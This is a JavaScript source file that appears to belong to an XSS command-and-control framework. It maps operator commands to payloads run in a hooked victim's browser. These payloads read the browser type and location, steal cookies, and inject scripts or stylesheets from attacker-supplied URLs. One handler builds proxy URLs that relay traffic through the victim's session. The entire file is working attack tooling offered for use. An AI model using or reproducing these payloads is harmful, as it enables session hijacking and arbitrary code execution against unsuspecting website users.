import { addNewLog } from './xss_core';

export const directives = [{
    directive : '/get/browser/version',
    payload : 'window.cachex.utils.getBrwVersion()'
},{
    directive : '/get/browser/type',
    payload : 'window.cachex.utils.getBrw()'
},{
    directive : '/get/cookie',
    payload : 'window.cachex.utils.getCookie()'
},{
    directive : '/get/location',
    payload : 'window.cachex.utils.getLocation()'
},{
    directive : '/load/js',
    payload : args => {
        return `document.body.appendChild(document.createElement('script')).src='${args[0]}'`;
    }
},{
    directive : '/load/css',
    payload : args => {
        return `var d=document.createElement('link');d.rel='stylesheet';d.href='${args[0]}';document.head.appendChild(d);`;
    }
},{
    directive : '/generate/proxy_url',
    payload : {
        handler(session, args){
            try{
                const url = new URL(args[0]);
                const port = url.port || (function(){
                    switch(url.protocol){
                        case 'http:': return 80;
                        case 'https:': return 443;
                        case 'ftp:': return 21;
                        case 'ssh:': return 22;
                    }
                })();
                const proxy_domain = `代理url为：${url.protocol.substr(0, url.protocol.length - 1)}.${port}.` + 
                    `${url.hostname}.${session.proxy_domain.server_name}.${session.proxy_domain.host}:${session.proxy_domain.port}` + 
                    `${url.pathname === '/' ? '' : url.pathname}/${url.search}`;
                addNewLog(session.id, 'PROXY', proxy_domain, 'grey');
            }catch(e){
                addNewLog(session.id, 'PROXY', e, 'red');
            }
        }
    }
}];